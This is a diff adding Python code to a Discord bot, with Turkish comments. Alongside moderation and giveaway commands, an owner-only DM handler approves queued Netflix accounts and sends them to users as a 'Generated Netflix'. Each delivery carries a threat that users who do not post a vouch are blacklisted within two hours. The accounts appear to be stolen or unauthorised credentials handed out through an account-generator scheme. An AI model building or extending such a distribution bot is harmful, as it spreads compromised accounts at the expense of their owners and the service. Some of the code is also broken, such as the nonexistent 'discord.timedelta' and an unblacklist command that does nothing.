+async def giveaway_cmd(interaction: discord.Interaction, channel: discord.TextChannel, prize: str, duration: str, winners: int):
+    if not any(r.id in STAFF_ROLES for r in interaction.user.roles) and interaction.user.id != OWNER_ID:
+        return await interaction.response.send_message("❌ Staff only.", ephemeral=True)
+    
+    await interaction.response.defer(ephemeral=True)
+    
+    seconds = 0
+    if duration.endswith("s"): seconds = int(duration[:-1])
+    elif duration.endswith("m"): seconds = int(duration[:-1]) * 60
+    elif duration.endswith("h"): seconds = int(duration[:-1]) * 3600
+    elif duration.endswith("d"): seconds = int(duration[:-1]) * 86400
+    
+    end_time = time.time() + seconds
+    view = GiveawayView(prize, winners, end_time, interaction.user.id)
+    try:
+        msg = await channel.send(embed=view.get_embed(), view=view)
+        bot.active_giveaways[msg.id] = view
+        await interaction.followup.send(f"✅ Giveaway started in {channel.mention}", ephemeral=True)
+    except Exception as e:
+        return await interaction.followup.send(f"❌ Error: {e}", ephemeral=True)
+    
+    await asyncio.sleep(seconds)
+    if msg.id in bot.active_giveaways:
+        g_view = bot.active_giveaways.pop(msg.id)
+        g_view.stop()
+        if not g_view.entries:
+            await channel.send(f"❌ Giveaway for **{prize}** ended with no participants.")
+        else:
+            winners_list = random.sample(list(g_view.entries), min(winners, len(g_view.entries)))
+            mentions = ", ".join([f"<@{w}>" for w in winners_list])
+            await channel.send(f"🎉 **Giveaway Ended!**\nPrize: **{prize}**\nWinners: {mentions}\n\n*Congratulations! Open a ticket to claim your prize.*")
+
+@bot.tree.command(name="unlocklimit", description="Reset a user's limit (Staff Only)")
+async def unlocklimit_cmd(interaction: discord.Interaction, user: discord.Member):
+    if not any(r.id in STAFF_ROLES for r in interaction.user.roles) and interaction.user.id != OWNER_ID:
+        return await interaction.response.send_message("❌ Staff only.", ephemeral=True)
+    await interaction.response.defer(ephemeral=True)
+    if user.id in bot.cooldowns: bot.cooldowns[user.id].clear()
+    await interaction.followup.send(f"✅ Limits reset for {user.mention}.", ephemeral=True)
+
+@bot.tree.command(name="premium", description="Give premium role (Staff Only)")
+async def premium_cmd(interaction: discord.Interaction, user: discord.Member):
+    if not any(r.id in STAFF_ROLES for r in interaction.user.roles) and interaction.user.id != OWNER_ID:
+        return await interaction.response.send_message("❌ Staff only.", ephemeral=True)
+    
+    await interaction.response.defer(ephemeral=True)
+    role = interaction.guild.get_role(PREMIUM_ROLE)
+    if not role:
+        return await interaction.followup.send("❌ Premium role not found on this server.", ephemeral=True)
+    
+    try:
+        await user.add_roles(role)
+        await interaction.followup.send(f"✅ Gave {role.name} to {user.mention}.", ephemeral=True)
+    except discord.Forbidden:
+        await interaction.followup.send("❌ I don't have permission to give this role (Check role hierarchy).", ephemeral=True)
+    except Exception as e:
+        await interaction.followup.send(f"❌ Error: {e}", ephemeral=True)
+
+@bot.tree.command(name="exclusive", description="Give exclusive role (Staff Only)")
+async def exclusive_cmd(interaction: discord.Interaction, user: discord.Member):
+    if not any(r.id in STAFF_ROLES for r in interaction.user.roles) and interaction.user.id != OWNER_ID:
+        return await interaction.response.send_message("❌ Staff only.", ephemeral=True)
+    
+    await interaction.response.defer(ephemeral=True)
+    role = interaction.guild.get_role(EXCLUSIVE_ROLE)
+    if not role:
+        return await interaction.followup.send("❌ Exclusive role not found on this server.", ephemeral=True)
+        
+    try:
+        await user.add_roles(role)
+        await interaction.followup.send(f"✅ Gave {role.name} to {user.mention}.", ephemeral=True)
+    except discord.Forbidden:
+        await interaction.followup.send("❌ I don't have permission to give this role (Check role hierarchy).", ephemeral=True)
+    except Exception as e:
+        await interaction.followup.send(f"❌ Error: {e}", ephemeral=True)
+
+@bot.tree.command(name="ban", description="Ban a member")
+async def ban_cmd(interaction: discord.Interaction, member: discord.Member, reason: str = "No reason provided"):
+    if not any(r.id in STAFF_ROLES for r in interaction.user.roles) and interaction.user.id != OWNER_ID:
+        return await interaction.response.send_message("❌ Staff only.", ephemeral=True)
+    await interaction.response.defer(ephemeral=True)
+    try:
+        await member.ban(reason=reason)
+        await interaction.followup.send(f"🔨 Banned {member.mention}. Reason: {reason}", ephemeral=True)
+    except Exception as e:
+        await interaction.followup.send(f"❌ Error: {e}", ephemeral=True)
+
+@bot.tree.command(name="kick", description="Kick a member")
+async def kick_cmd(interaction: discord.Interaction, member: discord.Member, reason: str = "No reason provided"):
+    if not any(r.id in STAFF_ROLES for r in interaction.user.roles) and interaction.user.id != OWNER_ID:
+        return await interaction.response.send_message("❌ Staff only.", ephemeral=True)
+    await interaction.response.defer(ephemeral=True)
+    try:
+        await member.kick(reason=reason)
+        await interaction.followup.send(f"👢 Kicked {member.mention}. Reason: {reason}", ephemeral=True)
+    except Exception as e:
+        await interaction.followup.send(f"❌ Error: {e}", ephemeral=True)
+
+@bot.tree.command(name="mute", description="Mute a member (Timeout)")
+async def mute_cmd(interaction: discord.Interaction, member: discord.Member, duration: int):
+    if not any(r.id in STAFF_ROLES for r in interaction.user.roles) and interaction.user.id != OWNER_ID:
+        return await interaction.response.send_message("❌ Staff only.", ephemeral=True)
+    await interaction.response.defer(ephemeral=True)
+    try:
+        await member.timeout(discord.utils.utcnow() + discord.timedelta(minutes=duration))
+        await interaction.followup.send(f"🔇 Muted {member.mention} for {duration} minutes.", ephemeral=True)
+    except Exception as e:
+        await interaction.followup.send(f"❌ Error: {e}", ephemeral=True)
+
+@bot.tree.command(name="unblacklist", description="Remove user from blacklist (Owner Only)")
+async def unblacklist_cmd(interaction: discord.Interaction, user: discord.Member, duration: str):
+    if interaction.user.id != OWNER_ID:
+        return await interaction.response.send_message("❌ Owner only.", ephemeral=True)
+    await interaction.response.defer(ephemeral=True)
+    await interaction.followup.send(f"✅ {user.mention} has been removed from the blacklist.", ephemeral=True)
+
+# ==================== OWNER DM KOMUTLARI ====================
+
+@bot.event
+async def on_message(message):
+    if message.author.bot: return
+    if not isinstance(message.channel, discord.DMChannel): return
+    if message.author.id != OWNER_ID: return
+
+    content = message.content.lower()
+    
+    if content.startswith(".okey"):
+        try:
+            user_id = int(message.content.split("<@")[1].split(">")[0].replace("!", ""))
+            if user_id in pending_netflix:
+                acc = pending_netflix.pop(user_id)
+                approved_netflix[user_id] = acc
+                user = await bot.fetch_user(user_id)
+                await message.reply(f"✅ Okeylendi: **{user.name}**\nŞimdi hesabı göndermek için: `.send @{user.name}`")
+            else:
+                await message.reply("❌ Bu kullanıcı için bekleyen Netflix isteği yok.")
+        except:
+            await message.reply("❌ Kullanım: `.okey @kullanıcı`")
+            
+    elif content.startswith(".send"):
+        try:
+            user_id = int(message.content.split("<@")[1].split(">")[0].replace("!", ""))
+            if user_id in approved_netflix:
+                acc = approved_netflix.pop(user_id)
+                user = await bot.fetch_user(user_id)
+                
+                try:
+                    await user.send(f"🎬 **Generated Netflix:**\n```\n{acc}\n```\n\n**Do Vouch or You get blacklist in 2 hours.**\nVouch here: <#{VOUCH_CHANNEL}> and type `Ravex`")
+                    await message.reply(f"✅ Hesap **{user.name}** kişisine DM'den gönderildi ve Vouch uyarısı yapıldı.")
+                    
+                    async def check_vouch():
+                        await asyncio.sleep(7200)
+                        vouch_channel = bot.get_channel(VOUCH_CHANNEL)
+                        if vouch_channel:
+                            async for msg in vouch_channel.history(limit=100):
+                                if msg.author.id == user_id and "ravex" in msg.content.lower():
+                                    try: await msg.add_reaction("✅")
+                                    except: pass
+                                    return
+                            log_channel = bot.get_channel(TICKET_LOG_CHANNEL)
+                            if log_channel:
+                                await log_channel.send(f"⚠️ **Blacklist:** {user.mention} vouch atmadı.")
+                    asyncio.create_task(check_vouch())
+                    
+                except discord.Forbidden:
+                    await message.reply("❌ Kullanıcının DM'leri kapalı, gönderilemedi.")
+            else:
+                await message.reply("❌ Bu kullanıcı okeylenmemiş. Önce `.okey @kullanıcı` yaz.")
+        except:
+            await message.reply("❌ Kullanım: `.send @kullanıcı`")
+
+    await bot.process_commands(message)
+
+# ==================== ÇALIŞTIR ====================
+if __name__ == "__main__":
+    if not TOKEN or not OWNER_ID or not WEB_PASSWORD:
+        print("❌ HATA: .env dosyasında DISCORD_TOKEN, OWNER_ID veya WEB_PASSWORD eksik!")
+        exit()
+    bot.run(TOKEN)
